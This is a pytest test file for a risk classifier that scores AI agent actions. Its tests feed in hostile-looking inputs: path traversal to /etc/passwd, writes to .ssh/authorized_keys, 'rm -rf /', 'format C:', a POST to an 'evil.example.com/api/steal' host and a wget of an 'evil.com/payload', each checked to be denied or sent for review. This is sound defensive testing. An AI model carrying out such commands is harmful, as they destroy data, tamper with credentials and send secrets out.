from __future__ import annotations

import json
import time
from datetime import datetime, timedelta, timezone
from pathlib import Path

import pytest

from modules.trust_layer.src.risk_classifier import (
    DEFAULT_RULES,
    RiskClassifier,
    RiskRule,
)


class TestRules:
    def test_r1_delete_outside_workspace_denied(self):
        classifier = RiskClassifier()
        score = classifier.classify("delete_file", "../../etc/passwd", "workspace")
        assert score.verdict == "deny"
        assert score.score == 1.0
        assert "R1" in score.matched_rules

    def test_r2_sensitive_path_denied(self):
        classifier = RiskClassifier()
        score = classifier.classify("write_file", "/etc/config.yaml", "workspace_write")
        assert score.verdict == "deny"
        assert "R2" in score.matched_rules

    def test_r2_sensitive_path_windows_denied(self):
        classifier = RiskClassifier()
        score = classifier.classify("write_file", r"C:\Windows\System32\drivers\etc\hosts", "workspace_write")
        assert score.verdict == "deny"
        assert "R2" in score.matched_rules

    def test_r2_sensitive_path_ssh_denied(self):
        classifier = RiskClassifier()
        score = classifier.classify("write_file", "/home/user/.ssh/authorized_keys", "workspace_write")
        assert score.verdict == "deny"
        assert "R2" in score.matched_rules

    def test_r3_destructive_cmd_denied(self):
        classifier = RiskClassifier()
        score = classifier.classify("run_terminal", "rm -rf /", "system")
        assert score.verdict == "deny"
        assert "R3" in score.matched_rules

    def test_r3_format_cmd_denied(self):
        classifier = RiskClassifier()
        score = classifier.classify("run_terminal", "format C: /FS:NTFS", "system")
        assert score.verdict == "deny"
        assert "R3" in score.matched_rules

    def test_r4_http_post_unknown_origin_denied(self):
        classifier = RiskClassifier()
        score = classifier.classify("http_post", "https://evil.example.com/api/steal", "external_write")
        assert score.verdict == "deny"
        assert "R4" in score.matched_rules

    def test_r4_http_post_known_origin_passes(self):
        classifier = RiskClassifier()
        score = classifier.classify("http_post", "https://api.github.com/repos", "external_write")
        assert score.verdict != "deny"

    def test_r5_install_review(self):
        classifier = RiskClassifier()
        score = classifier.classify("install", "somepackage", "external_write")
        assert score.verdict == "review"
        assert score.score == 0.9
        assert "R5" in score.matched_rules

    def test_r6_deploy_review(self):
        classifier = RiskClassifier()
        score = classifier.classify("deploy", "production", "external_write")
        assert score.verdict == "review"
        assert score.score == 0.9
        assert "R6" in score.matched_rules

    def test_r7_secret_var_review(self):
        classifier = RiskClassifier()
        score = classifier.classify("read_env", "API_KEY", "external_read")
        assert score.verdict == "review"
        assert score.score == 0.8
        assert "R7" in score.matched_rules

    def test_r7_password_var_review(self):
        classifier = RiskClassifier()
        score = classifier.classify("read_env", "DB_PASSWORD", "external_read")
        assert score.verdict == "review"
        assert "R7" in score.matched_rules

    def test_r8_network_cmd_review(self):
        classifier = RiskClassifier()
        score = classifier.classify("run_terminal", "curl http://example.com", "workspace_write")
        assert score.verdict == "review"
        assert score.score == 0.7
        assert "R8" in score.matched_rules

    def test_r8_wget_network_cmd_review(self):
        classifier = RiskClassifier()
        score = classifier.classify("run_terminal", "wget http://evil.com/payload", "workspace_write")
        assert score.verdict == "review"
        assert "R8" in score.matched_rules

    def test_r10_t1_skipped(self):
        classifier = RiskClassifier()
        score = classifier.classify("read_file", "notes.txt", "workspace")
        assert score.verdict == "pass"
        assert "R10" in score.matched_rules

    def test_r10_t2_skipped(self):
        classifier = RiskClassifier()
        score = classifier.classify("write_file", "notes.txt", "workspace_write")
        assert score.verdict == "pass"

    def test_no_match_returns_pass(self):
        classifier = RiskClassifier()
        score = classifier.classify("view_history", "", "workspace")
        assert score.verdict == "pass"
        assert score.score == 0.0


class TestRuleOrdering:
    def test_first_match_wins_delete_overrides_t1(self):
        classifier = RiskClassifier()
        score = classifier.classify("delete_file", "../../etc/shadow", "workspace")
        assert score.verdict == "deny"
        assert score.matched_rules == ["R1"]

    def test_first_match_wins_install_review_overrides_t2(self):
        classifier = RiskClassifier()
        score = classifier.classify("install", "package", "workspace_write")
        assert score.verdict == "review"
        assert score.matched_rules == ["R5"]


class TestHistory:
    def test_repeated_failures_triggers_review(self):
        classifier = RiskClassifier()
        now = datetime.now(timezone.utc)
        history = [
            {"action_type": "write_file", "success": False, "timestamp": now - timedelta(minutes=5)},
            {"action_type": "write_file", "success": False, "timestamp": now - timedelta(minutes=10)},
            {"action_type": "write_file", "success": False, "timestamp": now - timedelta(minutes=15)},
            {"action_type": "write_file", "success": False, "timestamp": now - timedelta(minutes=20)},
            {"action_type": "write_file", "success": False, "timestamp": now - timedelta(minutes=25)},
        ]
        score = classifier.classify("write_file", "test.txt", "workspace_write", history)
        assert score.verdict == "review"
        assert score.score == 0.7
        assert "R9" in score.matched_rules

    def test_fewer_than_5_failures_ignored(self):
        classifier = RiskClassifier()
        now = datetime.now(timezone.utc)
        history = [
            {"action_type": "write_file", "success": False, "timestamp": now - timedelta(minutes=5)},
            {"action_type": "write_file", "success": False, "timestamp": now - timedelta(minutes=10)},
        ]
        score = classifier.classify("write_file", "test.txt", "workspace_write", history)
        assert score.verdict == "pass"

    def test_old_failures_outside_window_ignored(self):
        classifier = RiskClassifier()
        now = datetime.now(timezone.utc)
        history = [
            {"action_type": "write_file", "success": False, "timestamp": now - timedelta(hours=2)},
            {"action_type": "write_file", "success": False, "timestamp": now - timedelta(hours=3)},
            {"action_type": "write_file", "success": False, "timestamp": now - timedelta(hours=4)},
            {"action_type": "write_file", "success": False, "timestamp": now - timedelta(hours=5)},
            {"action_type": "write_file", "success": False, "timestamp": now - timedelta(hours=6)},
        ]
        score = classifier.classify("write_file", "test.txt", "workspace_write", history)
        assert score.verdict == "pass"

    def test_empty_history_no_review(self):
        classifier = RiskClassifier()
        score = classifier.classify("write_file", "test.txt", "workspace_write", [])
        assert score.verdict == "pass"

    def test_history_without_timestamp_fails_safely(self):
        classifier = RiskClassifier()
        history = [{"action_type": "write_file", "success": False}]
        score = classifier.classify("write_file", "test.txt", "workspace_write", history)
        assert score.verdict == "pass"


class TestPerformance:
    def test_classify_runs_under_10ms(self):
        classifier = RiskClassifier()
        start = time.perf_counter()
        for _ in range(100):
            classifier.classify("deploy", "production", "external_write")
        elapsed_ms = (time.perf_counter() - start) * 10
        assert elapsed_ms < 10.0

    def test_classify_with_history_under_10ms(self):
        classifier = RiskClassifier()
        now = datetime.now(timezone.utc)
        history = [
            {"action_type": "write_file", "success": True, "timestamp": now - timedelta(minutes=5)},
            {"action_type": "write_file", "success": False, "timestamp": now - timedelta(minutes=10)},
        ]
        start = time.perf_counter()
        for _ in range(100):
            classifier.classify("write_file", "test.txt", "workspace_write", history)
        elapsed_ms = (time.perf_counter() - start) * 10
        assert elapsed_ms < 10.0


class TestRulesFromJSON:
    def test_load_rules_from_file(self):
        import tempfile
        tmpdir = tempfile.mkdtemp()
        rules_file = Path(tmpdir) / "custom_rules.json"
        rules_file.write_text(json.dumps([
            {
                "rule_id": "C1",
                "condition": "action == 'custom_action'",
                "verdict": "deny",
                "score": 0.95,
                "reason_template": "Custom rule matched",
            }
        ]), encoding="utf-8")
        classifier = RiskClassifier(str(rules_file))
        score = classifier.classify("custom_action", "anything", "workspace")
        assert score.verdict == "deny"
        assert score.score == 0.95

    def test_missing_rules_file_logs_warning(self, caplog):
        import logging
        caplog.set_level(logging.WARNING)
        classifier = RiskClassifier("/nonexistent/rules.json")
        assert any("not found" in msg for msg in caplog.messages)

    def test_invalid_json_does_not_crash(self, caplog):
        import logging
        import tempfile
        caplog.set_level(logging.ERROR)
        tmpdir = tempfile.mkdtemp()
        rules_file = Path(tmpdir) / "bad.json"
        rules_file.write_text("not valid json", encoding="utf-8")
        classifier = RiskClassifier(str(rules_file))
        score = classifier.classify("read_file", "test.txt", "workspace")
        assert score.verdict == "pass"

    def test_rule_order_preserved_from_json(self):
        import tempfile
        tmpdir = tempfile.mkdtemp()
        rules_file = Path(tmpdir) / "ordered.json"
        rules_file.write_text(json.dumps([
            {"rule_id": "X1", "condition": "action == 'alpha'", "verdict": "deny", "score": 1.0, "reason_template": ""},
            {"rule_id": "X2", "condition": "action == 'alpha'", "verdict": "pass", "score": 0.0, "reason_template": ""},
        ]), encoding="utf-8")
        classifier = RiskClassifier(str(rules_file))
        score = classifier.classify("alpha", "target", "workspace")
        assert score.verdict == "deny"


class TestScopeMapping:
    def test_workspace_scope_maps_to_t1(self):
        classifier = RiskClassifier()
        score = classifier.classify("read_file", "notes.txt", "workspace")
        assert score.verdict == "pass"

    def test_system_scope_maps_to_t4(self):
        classifier = RiskClassifier()
        score = classifier.classify("run_terminal", "rm -rf /", "system")
        assert score.verdict == "deny"
